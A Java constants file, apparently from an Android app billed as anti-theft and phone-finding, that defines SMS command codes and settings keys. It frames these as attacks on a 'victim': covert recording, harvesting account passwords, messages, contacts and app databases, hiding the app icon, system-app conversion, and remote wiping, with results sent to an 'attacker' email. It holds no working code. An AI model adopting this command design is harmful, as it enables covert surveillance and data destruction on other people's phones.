package tuisolutions.tuisecurity.models;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public interface Parameters {
    static int BIT_LENGTH = 1024;
    // Attack victim information Type
    int GET_SYSTEM = 1;
    int GET_DUMP = 2;
    int GET_MESSAGE = 3;
    int GET_CONTACT = 4;
    int GET_MAP_HISTORY = 5;
    int GET_YOUTUBE_HISTORY = 6;
    int GET_FACEBOOK_DB = 7;
    int GET_YAHOO_HISTORY = 8;
    int GET_ACCOUNT = 9;
    int GET_CALENDAR = 10;
    
    int DELETE_MESSAGE = 13;
    int DELETE_CONTACT = 14;
    int DELETE_MAP_HISTORY = 15;
    int DELETE_YOUTUBE_HISTORY = 16;
    int DElETE_FACEBOOK_DB = 17;
    int DELETE_YAHOO_HISTORY = 18;
    int DELETE_ACCOUNT= 19;
    int DELETE_CALENDAR= 20;
    // Backup & Restore
    int BACKUP_TYPE = 21;
    int RESTORE_TYPE = 22;
    int BACKUP_RESTORE_CONTACT = 23;
    int BACKUP_RESTORE_MESSAGE = 24;
    int REQUEST_PHONE_NUMBER_CODE = 1;
	int REQUEST_FILE_ON_SDCARD_CODE = 2;
	
    // sms adversity info
    String DK_STRING = "DK";
    String TO_SMS_PHONE = "8798";
    // String SMS_CODE = "767938";
    String SMS_CONTENT = "Tra tien anh di em yeu";
    String FINDER_LOCATION_CODE = "Location: ";
    
    // Commands -- Use in victim phone
    
    // Urgent Command - for basic feature, best quick when losing phone
    String COMMAND_URGENT_CASE = "urdl";
    
    // spyware command
    String COMMAND_RECORD_AUTO_STOP_WITH_INTERACTION = "autrecin";
    String COMMAND_RECORD_AUTO_STOP_WITH_LIMIT_TIME = "autreclt";
    String COMMAND_GET_LOCATION = "geloc";
    String COMMAND_GET_SIM_INFO = "gesim";
    
    // Delete command
    String COMMAND_BACKUP_DELETE_MESSAGE = "demgn";// No delete
    String COMMAND_BACKUP_DELETE_CONTACT = "decton";// No delete
    String COMMAND_FORMAT_SD_CARD = "forsd";
    String COMMAND_BACKUP_DELETE_MESSAGE_DELETE = "demgd";// delete after backup
    String COMMAND_BACKUP_DELETE_CONTACT_DELETE = "dectod";// delete after backup
    
    // get victim info command
    String COMMAND_ACCOUNT_PASSWORD = "acpw";
    String COMMAND_SYSTEM = "syst";
    String COMMAND_CONTACT_DB = "gcet";
    String COMMAND_MESSAGE_DB = "gemss";
    String COMMAND_SEARCH_MAP_DB = "mahis";
    String COMMAND_YOUTUBE_DB = "yohis";
    String COMMAND_YAHOO_DB = "yahis";
    String COMMAND_FACEBOOK_DB = "fahis";
    String COMMAND_CALENDAR_DB = "caldb";
    
    // secure app
    String COMMAND_SHOW_APP_ICON = "showicon";
    String COMMAND_HIDE_APP_ICON = "hideicon";
    String COMMAND_ALARM = "alm";
    
    @SuppressWarnings("serial")
    Map<String, String> COMMANDS = new HashMap<String, String>() {
        {
            // Urgent Command
            put(COMMAND_URGENT_CASE, COMMAND_URGENT_CASE);
            
            // spyware command
            put(COMMAND_RECORD_AUTO_STOP_WITH_INTERACTION, COMMAND_RECORD_AUTO_STOP_WITH_INTERACTION);
            put(COMMAND_RECORD_AUTO_STOP_WITH_LIMIT_TIME, COMMAND_RECORD_AUTO_STOP_WITH_LIMIT_TIME);
            // Delete command
            put(COMMAND_BACKUP_DELETE_MESSAGE, COMMAND_BACKUP_DELETE_MESSAGE);
            put(COMMAND_BACKUP_DELETE_CONTACT, COMMAND_BACKUP_DELETE_CONTACT);
            put(COMMAND_BACKUP_DELETE_MESSAGE_DELETE, COMMAND_BACKUP_DELETE_MESSAGE_DELETE);
            put(COMMAND_BACKUP_DELETE_CONTACT_DELETE, COMMAND_BACKUP_DELETE_CONTACT_DELETE);
            put(COMMAND_FORMAT_SD_CARD, COMMAND_FORMAT_SD_CARD);
            
            // get victim info command
            put(COMMAND_ACCOUNT_PASSWORD, COMMAND_ACCOUNT_PASSWORD);
            put(COMMAND_SYSTEM, COMMAND_SYSTEM);
            put(COMMAND_CONTACT_DB, COMMAND_CONTACT_DB);
            put(COMMAND_MESSAGE_DB, COMMAND_MESSAGE_DB);
            put(COMMAND_SEARCH_MAP_DB, COMMAND_SEARCH_MAP_DB);
            put(COMMAND_YOUTUBE_DB, COMMAND_YOUTUBE_DB);
            put(COMMAND_YAHOO_DB, COMMAND_YAHOO_DB);
            put(COMMAND_FACEBOOK_DB, COMMAND_FACEBOOK_DB);
            put(COMMAND_CALENDAR_DB, COMMAND_CALENDAR_DB);
            
            put(COMMAND_GET_LOCATION, COMMAND_GET_LOCATION);
            put(COMMAND_GET_SIM_INFO, COMMAND_GET_SIM_INFO);
            
            put(COMMAND_SHOW_APP_ICON, COMMAND_SHOW_APP_ICON);
            put(COMMAND_HIDE_APP_ICON, COMMAND_HIDE_APP_ICON);
            put(COMMAND_ALARM, COMMAND_ALARM);
        }
    };
    
    // Preferences attribute
    String MOD_ENBALE_ALL = "enable_all_features";
    String VICTIM_NUMBER = "sms_phone_notification";
    String FROM_EMAIL = "email_sent";
    String FROM_EMAIL_PASSWORD = "email_sent_password";
    String ATTACKER_EMAIL = "email_recipient";
    String SAVE_FILE_PATH = "save_file_path";
    String ACCELERATION_RECORDING_DELTA_TIME = "acceleration_recording_delta_time";
    String ACCELERATION_EMAIL_SEND_TIME = "acceleration_email_send_time";
    String ACCELERATION_RECORDING_LIMIT_TIME = "acceleration_recording_limit_time";
    String TIME_RECORDING_LIMIT = "time_recording_limit";
    String IS_CONVERT_SYSTEM_APP = "convert_to_system_app";
    String IS_CONVERTED_TO_SYSTEM_APP = "converted_to_system_app";
    String IS_HIDE_APP_ICON = "enable_hidden_icon";
    String THRESHOLD_NUMBER = "secure_threshold";
    String IS_LOCK_AND_ALARM_AFTER_REBOOT = "enable_lock_and_alarm_after_reboot";
    String INTERACTION_ALLOW_TIME = "interaction_allow_time";
    
    // Apps Parameters
    String KEYWORD = "key";
    String AD_STRING = "sms_config";
    String MOD_DELETE_CONTACT = "delete contact";
    String MOD_DELETE_SMS = "delete sms";
    String MOD_FACTORY_RESET = "phone_factory_reset";
    String MOD_FORMAT_SDCARD = "format SC Card";
    
    String SETTINGS_PIN = "setting_pin";
    String SETTINGS_NUMBER_RETURN = "num_return";
    String SETTINGS_MSG_RETURN = "msg_return";
    
    String IS_FIRST_RUN = "first run";
    String IS_SET_PASSWORD = "_password";
    String IS_PROTECTED_PW = "protected pw";
    String PASSWORD_THROUGH = "pw through";
    String IS_ACTIVATED = "activated";
    String IS_SET_SETTINGS = "isSettings";
    String PHONE_IMEI = "phone_imei";
    String OLD_SIM_SERIAL = "SIM serial";
    
    String SERVICE_BASIC_FEATURES = "Basic Features";
    String SERVICE_PHONE_ALERT = "Phone Alert";
    String SERVICE_ANTI_THIEF = "Anti Theft";
    String SERVICE_PHONE_FINDING = "Phone Finding";
    String SERVICE_PHONE_SPYING = "Remote Control";
    String SERVICE_WEB_SERVICE = "Web Remote";
    
    @SuppressWarnings("serial")
    List<String> FEATURES = new ArrayList<String>() {
        {
            add(SERVICE_BASIC_FEATURES);
            add(SERVICE_PHONE_ALERT);
            add(SERVICE_ANTI_THIEF);
            add(SERVICE_PHONE_FINDING);
            add(SERVICE_PHONE_SPYING);
            add(SERVICE_WEB_SERVICE);
        }
    };
    
    /***
     * Service params
     */
    int SERVICE_REGISTER = 1001;
    int SERVICE_LOGIN = 1002;
    int SERVICE_FORGOT_PASSWORD = 1003;
    int SERVICE_SEND_SMS = 1004;
    /**
     * Secure app params
     */
    String SECURE_APP_TYPE = "secure app type";
    int SECURE_APP_TYPE_HIDE_ICON = 2004;
    int SECURE_APP_TYPE_SHOW_ICON = 2005;
    int SECURE_APP_TYPE_LOCK_SCREEN = 2006;
    int SECURE_APP_TYPE_ALARM = 2007;
    String ALARM_AND_LOCK = "Alarm and Lock Screen";
    // for sim get info feature
    static String SIM_INFO = "SIM information";
    static String SIM_REQUEST = "TTTB";
    static String IS_GET_SIM_INFO = "is request SIM info flag";
    static String SENDER_REQUEST = "sender request";
    static String IS_POWER_ON = "is power on";
    // Sim exchange
    static String SIM_REQUEST_NUMBER_1 = "+1414";
    static String SIM_REQUEST_NUMBER_2 = "1414";
    
    /**
     * username and hash password
     */
    String USERNAME = "username";
    String HASH_PASSWORD = "hash password";
    
 
}
